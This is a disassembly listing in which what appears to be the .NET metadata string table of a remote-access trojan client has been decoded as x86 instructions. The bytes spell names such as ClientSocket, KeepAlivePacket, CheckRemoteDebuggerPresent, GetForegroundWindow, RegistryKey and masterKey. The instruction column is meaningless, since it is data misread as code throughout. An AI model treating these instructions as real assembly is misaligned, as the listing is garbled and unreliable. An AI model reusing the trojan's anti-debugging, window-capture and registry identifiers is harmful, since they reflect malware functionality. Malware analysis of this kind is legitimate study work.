  4090f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4090f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fa:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090fd:	00 49 6d             	add    %cl,0x6d(%ecx)
  409100:	61                   	popa
  409101:	67 65 46             	addr16 gs inc %esi
  409104:	6f                   	outsl  %ds:(%esi),(%dx)
  409105:	72 6d                	jb     0x409174
  409107:	61                   	popa
  409108:	74 00                	je     0x40910a
  40910a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40910c:	72 6d                	jb     0x40917b
  40910e:	61                   	popa
  40910f:	74 00                	je     0x409111
  409111:	57                   	push   %edi
  409112:	72 69                	jb     0x40917d
  409114:	74 65                	je     0x40917b
  409116:	46                   	inc    %esi
  409117:	6c                   	insb   (%dx),%es:(%edi)
  409118:	6f                   	outsl  %ds:(%esi),(%dx)
  409119:	61                   	popa
  40911a:	74 00                	je     0x40911c
  40911c:	67 65 74 5f          	addr16 gs je 0x40917f
  409120:	41                   	inc    %ecx
  409121:	73 46                	jae    0x409169
  409123:	6c                   	insb   (%dx),%es:(%edi)
  409124:	6f                   	outsl  %ds:(%esi),(%dx)
  409125:	61                   	popa
  409126:	74 00                	je     0x409128
  409128:	73 65                	jae    0x40918f
  40912a:	74 5f                	je     0x40918b
  40912c:	41                   	inc    %ecx
  40912d:	73 46                	jae    0x409175
  40912f:	6c                   	insb   (%dx),%es:(%edi)
  409130:	6f                   	outsl  %ds:(%esi),(%dx)
  409131:	61                   	popa
  409132:	74 00                	je     0x409134
  409134:	47                   	inc    %edi
  409135:	65 74 41             	gs je  0x409179
  409138:	73 46                	jae    0x409180
  40913a:	6c                   	insb   (%dx),%es:(%edi)
  40913b:	6f                   	outsl  %ds:(%esi),(%dx)
  40913c:	61                   	popa
  40913d:	74 00                	je     0x40913f
  40913f:	53                   	push   %ebx
  409140:	65 74 41             	gs je  0x409184
  409143:	73 46                	jae    0x40918b
  409145:	6c                   	insb   (%dx),%es:(%edi)
  409146:	6f                   	outsl  %ds:(%esi),(%dx)
  409147:	61                   	popa
  409148:	74 00                	je     0x40914a
  40914a:	46                   	inc    %esi
  40914b:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409152:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409156:	61                   	popa
  409157:	6e                   	outsb  %ds:(%esi),(%dx)
  409158:	61                   	popa
  409159:	67 65 6d             	gs insl (%dx),%es:(%di)
  40915c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40915e:	74 42                	je     0x4091a2
  409160:	61                   	popa
  409161:	73 65                	jae    0x4091c8
  409163:	4f                   	dec    %edi
  409164:	62 6a 65             	bound  %ebp,0x65(%edx)
  409167:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40916b:	6f                   	outsl  %ds:(%esi),(%dx)
  40916c:	72 63                	jb     0x4091d1
  40916e:	65 50                	gs push %eax
  409170:	61                   	popa
  409171:	74 68                	je     0x4091db
  409173:	4f                   	dec    %edi
  409174:	62 6a 65             	bound  %ebp,0x65(%edx)
  409177:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40917b:	6f                   	outsl  %ds:(%esi),(%dx)
  40917c:	6c                   	insb   (%dx),%es:(%edi)
  40917d:	6c                   	insb   (%dx),%es:(%edi)
  40917e:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409183:	6f                   	outsl  %ds:(%esi),(%dx)
  409184:	6e                   	outsb  %ds:(%esi),(%dx)
  409185:	6e                   	outsb  %ds:(%esi),(%dx)
  409186:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40918b:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40918f:	6e                   	outsb  %ds:(%esi),(%dx)
  409190:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409195:	65 74 00             	gs je  0x409198
  409198:	53                   	push   %ebx
  409199:	79 73                	jns    0x40920e
  40919b:	74 65                	je     0x409202
  40919d:	6d                   	insl   (%dx),%es:(%edi)
  40919e:	2e 4e                	cs dec %esi
  4091a0:	65 74 00             	gs je  0x4091a3
  4091a3:	53                   	push   %ebx
  4091a4:	65 74 00             	gs je  0x4091a7
  4091a7:	54                   	push   %esp
  4091a8:	61                   	popa
  4091a9:	72 67                	jb     0x409212
  4091ab:	65 74 00             	gs je  0x4091ae
  4091ae:	43                   	inc    %ebx
  4091af:	6c                   	insb   (%dx),%es:(%edi)
  4091b0:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b8:	64 6c                	fs insb (%dx),%es:(%edi)
  4091ba:	65 5f                	gs pop %edi
  4091bc:	50                   	push   %eax
  4091bd:	61                   	popa
  4091be:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091c1:	74 00                	je     0x4091c3
  4091c3:	4b                   	dec    %ebx
  4091c4:	65 65 70 41          	gs gs jo 0x409209
  4091c8:	6c                   	insb   (%dx),%es:(%edi)
  4091c9:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091d0:	65 74 00             	gs je  0x4091d3
  4091d3:	43                   	inc    %ebx
  4091d4:	6c                   	insb   (%dx),%es:(%edi)
  4091d5:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091dc:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091e0:	53                   	push   %ebx
  4091e1:	79 73                	jns    0x409256
  4091e3:	74 65                	je     0x40924a
  4091e5:	6d                   	insl   (%dx),%es:(%edi)
  4091e6:	2e 43                	cs inc %ebx
  4091e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e9:	6c                   	insb   (%dx),%es:(%edi)
  4091ea:	6c                   	insb   (%dx),%es:(%edi)
  4091eb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f1:	73 2e                	jae    0x409221
  4091f3:	49                   	dec    %ecx
  4091f4:	45                   	inc    %ebp
  4091f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f6:	75 6d                	jne    0x409265
  4091f8:	65 72 61             	gs jb  0x40925c
  4091fb:	74 6f                	je     0x40926c
  4091fd:	72 2e                	jb     0x40922d
  4091ff:	52                   	push   %edx
  409200:	65 73 65             	gs jae 0x409268
  409203:	74 00                	je     0x409205
  409205:	67 65 74 5f          	addr16 gs je 0x409268
  409209:	4f                   	dec    %edi
  40920a:	66 66 73 65          	data16 data16 jae 0x409273
  40920e:	74 00                	je     0x409210
  409210:	73 65                	jae    0x409277
  409212:	74 5f                	je     0x409273
  409214:	4f                   	dec    %edi
  409215:	66 66 73 65          	data16 data16 jae 0x40927e
  409219:	74 00                	je     0x40921b
  40921b:	53                   	push   %ebx
  40921c:	70 6c                	jo     0x40928a
  40921e:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409225:	6e 
  409226:	74 4f                	je     0x409277
  409228:	6e                   	outsb  %ds:(%esi),(%dx)
  409229:	45                   	inc    %ebp
  40922a:	78 69                	js     0x409295
  40922c:	74 00                	je     0x40922e
  40922e:	53                   	push   %ebx
  40922f:	61                   	popa
  409230:	6c                   	insb   (%dx),%es:(%edi)
  409231:	74 00                	je     0x409233
  409233:	49                   	dec    %ecx
  409234:	41                   	inc    %ecx
  409235:	73 79                	jae    0x4092b0
  409237:	6e                   	outsb  %ds:(%esi),(%dx)
  409238:	63 52 65             	arpl   %edx,0x65(%edx)
  40923b:	73 75                	jae    0x4092b2
  40923d:	6c                   	insb   (%dx),%es:(%edi)
  40923e:	74 00                	je     0x409240
  409240:	54                   	push   %esp
  409241:	6f                   	outsl  %ds:(%esi),(%dx)
  409242:	55                   	push   %ebp
  409243:	70 70                	jo     0x4092b5
  409245:	65 72 49             	gs jb  0x409291
  409248:	6e                   	outsb  %ds:(%esi),(%dx)
  409249:	76 61                	jbe    0x4092ac
  40924b:	72 69                	jb     0x4092b6
  40924d:	61                   	popa
  40924e:	6e                   	outsb  %ds:(%esi),(%dx)
  40924f:	74 00                	je     0x409251
  409251:	57                   	push   %edi
  409252:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409256:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40925d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409264:	65 
  409265:	43                   	inc    %ebx
  409266:	6c                   	insb   (%dx),%es:(%edi)
  409267:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40926e:	74 5f                	je     0x4092cf
  409270:	53                   	push   %ebx
  409271:	73 6c                	jae    0x4092df
  409273:	43                   	inc    %ebx
  409274:	6c                   	insb   (%dx),%es:(%edi)
  409275:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40927c:	74 5f                	je     0x4092dd
  40927e:	53                   	push   %ebx
  40927f:	73 6c                	jae    0x4092ed
  409281:	43                   	inc    %ebx
  409282:	6c                   	insb   (%dx),%es:(%edi)
  409283:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40928a:	74 5f                	je     0x4092eb
  40928c:	54                   	push   %esp
  40928d:	63 70 43             	arpl   %esi,0x43(%eax)
  409290:	6c                   	insb   (%dx),%es:(%edi)
  409291:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409298:	74 5f                	je     0x4092f9
  40929a:	54                   	push   %esp
  40929b:	63 70 43             	arpl   %esi,0x43(%eax)
  40929e:	6c                   	insb   (%dx),%es:(%edi)
  40929f:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  4092a6:	74 68                	je     0x409310
  4092a8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092aa:	74 69                	je     0x409315
  4092ac:	63 61 74             	arpl   %esp,0x74(%ecx)
  4092af:	65 41                	gs inc %ecx
  4092b1:	73 43                	jae    0x4092f6
  4092b3:	6c                   	insb   (%dx),%es:(%edi)
  4092b4:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092bb:	73 74                	jae    0x409331
  4092bd:	65 6d                	gs insl (%dx),%es:(%edi)
  4092bf:	2e 4d                	cs dec %ebp
  4092c1:	61                   	popa
  4092c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c3:	61                   	popa
  4092c4:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092c7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c9:	74 00                	je     0x4092cb
  4092cb:	45                   	inc    %ebp
  4092cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4092cd:	76 69                	jbe    0x409338
  4092cf:	72 6f                	jb     0x409340
  4092d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d2:	6d                   	insl   (%dx),%es:(%edi)
  4092d3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092d5:	74 00                	je     0x4092d7
  4092d7:	70 61                	jo     0x40933a
  4092d9:	72 65                	jb     0x409340
  4092db:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dc:	74 00                	je     0x4092de
  4092de:	53                   	push   %ebx
  4092df:	79 73                	jns    0x409354
  4092e1:	74 65                	je     0x409348
  4092e3:	6d                   	insl   (%dx),%es:(%edi)
  4092e4:	2e 43                	cs inc %ebx
  4092e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4092e7:	6c                   	insb   (%dx),%es:(%edi)
  4092e8:	6c                   	insb   (%dx),%es:(%edi)
  4092e9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ef:	73 2e                	jae    0x40931f
  4092f1:	49                   	dec    %ecx
  4092f2:	45                   	inc    %ebp
  4092f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f4:	75 6d                	jne    0x409363
  4092f6:	65 72 61             	gs jb  0x40935a
  4092f9:	74 6f                	je     0x40936a
  4092fb:	72 2e                	jb     0x40932b
  4092fd:	43                   	inc    %ebx
  4092fe:	75 72                	jne    0x409372
  409300:	72 65                	jb     0x409367
  409302:	6e                   	outsb  %ds:(%esi),(%dx)
  409303:	74 00                	je     0x409305
  409305:	53                   	push   %ebx
  409306:	79 73                	jns    0x40937b
  409308:	74 65                	je     0x40936f
  40930a:	6d                   	insl   (%dx),%es:(%edi)
  40930b:	2e 43                	cs inc %ebx
  40930d:	6f                   	outsl  %ds:(%esi),(%dx)
  40930e:	6c                   	insb   (%dx),%es:(%edi)
  40930f:	6c                   	insb   (%dx),%es:(%edi)
  409310:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409315:	6e                   	outsb  %ds:(%esi),(%dx)
  409316:	73 2e                	jae    0x409346
  409318:	49                   	dec    %ecx
  409319:	45                   	inc    %ebp
  40931a:	6e                   	outsb  %ds:(%esi),(%dx)
  40931b:	75 6d                	jne    0x40938a
  40931d:	65 72 61             	gs jb  0x409381
  409320:	74 6f                	je     0x409391
  409322:	72 2e                	jb     0x409352
  409324:	67 65 74 5f          	addr16 gs je 0x409387
  409328:	43                   	inc    %ebx
  409329:	75 72                	jne    0x40939d
  40932b:	72 65                	jb     0x409392
  40932d:	6e                   	outsb  %ds:(%esi),(%dx)
  40932e:	74 00                	je     0x409330
  409330:	47                   	inc    %edi
  409331:	65 74 43             	gs je  0x409377
  409334:	75 72                	jne    0x4093a8
  409336:	72 65                	jb     0x40939d
  409338:	6e                   	outsb  %ds:(%esi),(%dx)
  409339:	74 00                	je     0x40933b
  40933b:	43                   	inc    %ebx
  40933c:	68 65 63 6b 52       	push   $0x526b6365
  409341:	65 6d                	gs insl (%dx),%es:(%edi)
  409343:	6f                   	outsl  %ds:(%esi),(%dx)
  409344:	74 65                	je     0x4093ab
  409346:	44                   	inc    %esp
  409347:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40934b:	67 65 72 50          	addr16 gs jb 0x40939f
  40934f:	72 65                	jb     0x4093b6
  409351:	73 65                	jae    0x4093b8
  409353:	6e                   	outsb  %ds:(%esi),(%dx)
  409354:	74 00                	je     0x409356
  409356:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40935d:	67 65 72 50          	addr16 gs jb 0x4093b1
  409361:	72 65                	jb     0x4093c8
  409363:	73 65                	jae    0x4093ca
  409365:	6e                   	outsb  %ds:(%esi),(%dx)
  409366:	74 00                	je     0x409368
  409368:	67 65 74 5f          	addr16 gs je 0x4093cb
  40936c:	52                   	push   %edx
  40936d:	65 6d                	gs insl (%dx),%es:(%edi)
  40936f:	6f                   	outsl  %ds:(%esi),(%dx)
  409370:	74 65                	je     0x4093d7
  409372:	45                   	inc    %ebp
  409373:	6e                   	outsb  %ds:(%esi),(%dx)
  409374:	64 50                	fs push %eax
  409376:	6f                   	outsl  %ds:(%esi),(%dx)
  409377:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40937e:	5f                   	pop    %edi
  40937f:	43                   	inc    %ebx
  409380:	6f                   	outsl  %ds:(%esi),(%dx)
  409381:	75 6e                	jne    0x4093f1
  409383:	74 00                	je     0x409385
  409385:	67 65 74 5f          	addr16 gs je 0x4093e8
  409389:	50                   	push   %eax
  40938a:	72 6f                	jb     0x4093fb
  40938c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40938f:	73 6f                	jae    0x409400
  409391:	72 43                	jb     0x4093d6
  409393:	6f                   	outsl  %ds:(%esi),(%dx)
  409394:	75 6e                	jne    0x409404
  409396:	74 00                	je     0x409398
  409398:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40939b:	6e                   	outsb  %ds:(%esi),(%dx)
  40939c:	74 00                	je     0x40939e
  40939e:	47                   	inc    %edi
  40939f:	65 74 50             	gs je  0x4093f2
  4093a2:	61                   	popa
  4093a3:	74 68                	je     0x40940d
  4093a5:	52                   	push   %edx
  4093a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a8:	74 00                	je     0x4093aa
  4093aa:	44                   	inc    %esp
  4093ab:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4093af:	70 74                	jo     0x409425
  4093b1:	00 45 6e             	add    %al,0x6e(%ebp)
  4093b4:	63 72 79             	arpl   %esi,0x79(%edx)
  4093b7:	70 74                	jo     0x40942d
  4093b9:	00 50 61             	add    %dl,0x61(%eax)
  4093bc:	72 61                	jb     0x40941f
  4093be:	6d                   	insl   (%dx),%es:(%edi)
  4093bf:	65 74 65             	gs je  0x409427
  4093c2:	72 69                	jb     0x40942d
  4093c4:	7a 65                	jp     0x40942b
  4093c6:	64 54                	fs push %esp
  4093c8:	68 72 65 61 64       	push   $0x64616572
  4093cd:	53                   	push   %ebx
  4093ce:	74 61                	je     0x409431
  4093d0:	72 74                	jb     0x409446
  4093d2:	00 43 6f             	add    %al,0x6f(%ebx)
  4093d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093d6:	76 65                	jbe    0x40943d
  4093d8:	72 74                	jb     0x40944e
  4093da:	00 46 61             	add    %al,0x61(%esi)
  4093dd:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093e4:	54 
  4093e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e6:	4c                   	dec    %esp
  4093e7:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093ee:	75 74                	jne    0x409464
  4093f0:	00 53 79             	add    %dl,0x79(%ebx)
  4093f3:	73 74                	jae    0x409469
  4093f5:	65 6d                	gs insl (%dx),%es:(%edi)
  4093f7:	2e 43                	cs inc %ebx
  4093f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fa:	6c                   	insb   (%dx),%es:(%edi)
  4093fb:	6c                   	insb   (%dx),%es:(%edi)
  4093fc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409401:	6e                   	outsb  %ds:(%esi),(%dx)
  409402:	73 2e                	jae    0x409432
  409404:	49                   	dec    %ecx
  409405:	45                   	inc    %ebp
  409406:	6e                   	outsb  %ds:(%esi),(%dx)
  409407:	75 6d                	jne    0x409476
  409409:	65 72 61             	gs jb  0x40946d
  40940c:	74 6f                	je     0x40947d
  40940e:	72 2e                	jb     0x40943e
  409410:	4d                   	dec    %ebp
  409411:	6f                   	outsl  %ds:(%esi),(%dx)
  409412:	76 65                	jbe    0x409479
  409414:	4e                   	dec    %esi
  409415:	65 78 74             	gs js  0x40948c
  409418:	00 53 79             	add    %dl,0x79(%ebx)
  40941b:	73 74                	jae    0x409491
  40941d:	65 6d                	gs insl (%dx),%es:(%edi)
  40941f:	2e 54                	cs push %esp
  409421:	65 78 74             	gs js  0x409498
  409424:	00 47 65             	add    %al,0x65(%edi)
  409427:	74 57                	je     0x409480
  409429:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409430:	78 74                	js     0x4094a6
  409432:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409436:	74 00                	je     0x409438
  409438:	76 00                	jbe    0x40943a
  40943a:	47                   	inc    %edi
  40943b:	65 74 46             	gs je  0x409484
  40943e:	6f                   	outsl  %ds:(%esi),(%dx)
  40943f:	72 65                	jb     0x4094a6
  409441:	67 72 6f             	addr16 jb 0x4094b3
  409444:	75 6e                	jne    0x4094b4
  409446:	64 57                	fs push %edi
  409448:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40944f:	65 74 5f             	gs je  0x4094b1
  409452:	43                   	inc    %ebx
  409453:	72 65                	jb     0x4094ba
  409455:	61                   	popa
  409456:	74 65                	je     0x4094bd
  409458:	4e                   	dec    %esi
  409459:	6f                   	outsl  %ds:(%esi),(%dx)
  40945a:	57                   	push   %edi
  40945b:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409462:	6e                   	outsb  %ds:(%esi),(%dx)
  409463:	64 65 78 00          	fs gs js 0x409467
  409467:	43                   	inc    %ebx
  409468:	6c                   	insb   (%dx),%es:(%edi)
  409469:	6f                   	outsl  %ds:(%esi),(%dx)
  40946a:	73 65                	jae    0x4094d1
  40946c:	4d                   	dec    %ebp
  40946d:	75 74                	jne    0x4094e3
  40946f:	65 78 00             	gs js  0x409472
  409472:	43                   	inc    %ebx
  409473:	72 65                	jb     0x4094da
  409475:	61                   	popa
  409476:	74 65                	je     0x4094dd
  409478:	4d                   	dec    %ebp
  409479:	75 74                	jne    0x4094ef
  40947b:	65 78 00             	gs js  0x40947e
  40947e:	44                   	inc    %esp
  40947f:	65 6c                	gs insb (%dx),%es:(%edi)
  409481:	61                   	popa
  409482:	79 00                	jns    0x409484
  409484:	57                   	push   %edi
  409485:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  40948c:	61                   	popa
  40948d:	79 00                	jns    0x40948f
  40948f:	49                   	dec    %ecx
  409490:	6e                   	outsb  %ds:(%esi),(%dx)
  409491:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409498:	65 
  409499:	41                   	inc    %ecx
  40949a:	72 72                	jb     0x40950e
  40949c:	61                   	popa
  40949d:	79 00                	jns    0x40949f
  40949f:	4d                   	dec    %ebp
  4094a0:	73 67                	jae    0x409509
  4094a2:	50                   	push   %eax
  4094a3:	61                   	popa
  4094a4:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  4094a7:	72 72                	jb     0x40951b
  4094a9:	61                   	popa
  4094aa:	79 00                	jns    0x4094ac
  4094ac:	54                   	push   %esp
  4094ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ae:	41                   	inc    %ecx
  4094af:	72 72                	jb     0x409523
  4094b1:	61                   	popa
  4094b2:	79 00                	jns    0x4094b4
  4094b4:	67 65 74 5f          	addr16 gs je 0x409517
  4094b8:	41                   	inc    %ecx
  4094b9:	73 41                	jae    0x4094fc
  4094bb:	72 72                	jb     0x40952f
  4094bd:	61                   	popa
  4094be:	79 00                	jns    0x4094c0
  4094c0:	72 65                	jb     0x409527
  4094c2:	66 41                	inc    %cx
  4094c4:	73 41                	jae    0x409507
  4094c6:	72 72                	jb     0x40953a
  4094c8:	61                   	popa
  4094c9:	79 00                	jns    0x4094cb
  4094cb:	67 65 74 5f          	addr16 gs je 0x40952e
  4094cf:	4b                   	dec    %ebx
  4094d0:	65 79 00             	gs jns 0x4094d3
  4094d3:	73 65                	jae    0x40953a
  4094d5:	74 5f                	je     0x409536
  4094d7:	4b                   	dec    %ebx
  4094d8:	65 79 00             	gs jns 0x4094db
  4094db:	43                   	inc    %ebx
  4094dc:	72 65                	jb     0x409543
  4094de:	61                   	popa
  4094df:	74 65                	je     0x409546
  4094e1:	53                   	push   %ebx
  4094e2:	75 62                	jne    0x409546
  4094e4:	4b                   	dec    %ebx
  4094e5:	65 79 00             	gs jns 0x4094e8
  4094e8:	44                   	inc    %esp
  4094e9:	65 6c                	gs insb (%dx),%es:(%edi)
  4094eb:	65 74 65             	gs je  0x409553
  4094ee:	53                   	push   %ebx
  4094ef:	75 62                	jne    0x409553
  4094f1:	4b                   	dec    %ebx
  4094f2:	65 79 00             	gs jns 0x4094f5
  4094f5:	4f                   	dec    %edi
  4094f6:	70 65                	jo     0x40955d
  4094f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4094f9:	53                   	push   %ebx
  4094fa:	75 62                	jne    0x40955e
  4094fc:	4b                   	dec    %ebx
  4094fd:	65 79 00             	gs jns 0x409500
  409500:	67 65 74 5f          	addr16 gs je 0x409563
  409504:	50                   	push   %eax
  409505:	75 62                	jne    0x409569
  409507:	6c                   	insb   (%dx),%es:(%edi)
  409508:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  40950f:	61                   	popa
  409510:	75 74                	jne    0x409586
  409512:	68 4b 65 79 00       	push   $0x79654b
  409517:	6d                   	insl   (%dx),%es:(%edi)
  409518:	61                   	popa
  409519:	73 74                	jae    0x40958f
  40951b:	65 72 4b             	gs jb  0x409569
  40951e:	65 79 00             	gs jns 0x409521
  409521:	52                   	push   %edx
  409522:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409529:	4b 65 
  40952b:	79 00                	jns    0x40952d
  40952d:	5f                   	pop    %edi
  40952e:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409532:	53                   	push   %ebx
  409533:	79 73                	jns    0x4095a8
  409535:	74 65                	je     0x40959c
  409537:	6d                   	insl   (%dx),%es:(%edi)
  409538:	2e 53                	cs push %ebx
  40953a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40953e:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409545:	70 
  409546:	74 6f                	je     0x4095b7
  409548:	67 72 61             	addr16 jb 0x4095ac
  40954b:	70 68                	jo     0x4095b5
  40954d:	79 00                	jns    0x40954f
  40954f:	41                   	inc    %ecx
  409550:	73 73                	jae    0x4095c5
  409552:	65 6d                	gs insl (%dx),%es:(%edi)
  409554:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409558:	41                   	inc    %ecx
  409559:	64 64 72 65          	fs fs jb 0x4095c2
  40955d:	73 73                	jae    0x4095d2
  40955f:	46                   	inc    %esi
  409560:	61                   	popa
  409561:	6d                   	insl   (%dx),%es:(%edi)
  409562:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409569:	63 
  40956a:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  40956e:	79 00                	jns    0x409570
  409570:	57                   	push   %edi
  409571:	72 69                	jb     0x4095dc
  409573:	74 65                	je     0x4095da
  409575:	42                   	inc    %edx
  409576:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  40957d:	6f                   	outsl  %ds:(%esi),(%dx)
  40957e:	42                   	inc    %edx
  40957f:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409586:	65 74 5f             	gs je  0x4095e8
  409589:	53                   	push   %ebx
  40958a:	79 73                	jns    0x4095ff
  40958c:	74 65                	je     0x4095f3
  40958e:	6d                   	insl   (%dx),%es:(%edi)
  40958f:	44                   	inc    %esp
  409590:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409597:	79 00                	jns    0x409599
  409599:	53                   	push   %ebx
  40959a:	65 74 52             	gs je  0x4095ef
  40959d:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  4095a4:	00 6f 
  4095a6:	70 5f                	jo     0x409607
  4095a8:	45                   	inc    %ebp
  4095a9:	71 75                	jno    0x409620
  4095ab:	61                   	popa
  4095ac:	6c                   	insb   (%dx),%es:(%edi)
  4095ad:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095b4:	49 
  4095b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b6:	65 71 75             	gs jno 0x40962e
  4095b9:	61                   	popa
  4095ba:	6c                   	insb   (%dx),%es:(%edi)
  4095bb:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095c2:	74 
  4095c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4095c5:	2e 4e                	cs dec %esi
  4095c7:	65 74 2e             	gs je  0x4095f8
  4095ca:	53                   	push   %ebx
  4095cb:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095cf:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095d6:	64 
  4095d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d8:	77 73                	ja     0x40964d
  4095da:	49                   	dec    %ecx
  4095db:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095de:	74 69                	je     0x409649
  4095e0:	74 79                	je     0x40965b
  4095e2:	00 49 73             	add    %cl,0x73(%ecx)
  4095e5:	4e                   	dec    %esi
  4095e6:	75 6c                	jne    0x409654
  4095e8:	6c                   	insb   (%dx),%es:(%edi)
  4095e9:	4f                   	dec    %edi
  4095ea:	72 45                	jb     0x409631
  4095ec:	6d                   	insl   (%dx),%es:(%edi)
  4095ed:	70 74                	jo     0x409663
  4095ef:	79 00                	jns    0x4095f1
  4095f1:	00 00                	add    %al,(%eax)
  4095f3:	00 00                	add    %al,(%eax)
  4095f5:	0d 53 00 48 00       	or     $0x480053,%eax
  4095fa:	41                   	inc    %ecx
  4095fb:	00 32                	add    %dh,(%edx)
  4095fd:	00 35 00 36 00 00    	add    %dh,0x3600
  409603:	80 d9 42             	sbb    $0x42,%cl
  409606:	00 45 00             	add    %al,0x0(%ebp)
  409609:	33 00                	xor    (%eax),%eax
  40960b:	2b 00                	sub    (%eax),%eax
  40960d:	41                   	inc    %ecx
  40960e:	00 45 00             	add    %al,0x0(%ebp)
  409611:	39 00                	cmp    %eax,(%eax)
  409613:	50                   	push   %eax
  409614:	00 66 00             	add    %ah,0x0(%esi)
  409617:	68 00 47 00 37       	push   $0x37004700
  40961c:	00 6f 00             	add    %ch,0x0(%edi)
  40961f:	30 00                	xor    %al,(%eax)
  409621:	6b 00 61             	imul   $0x61,(%eax),%eax
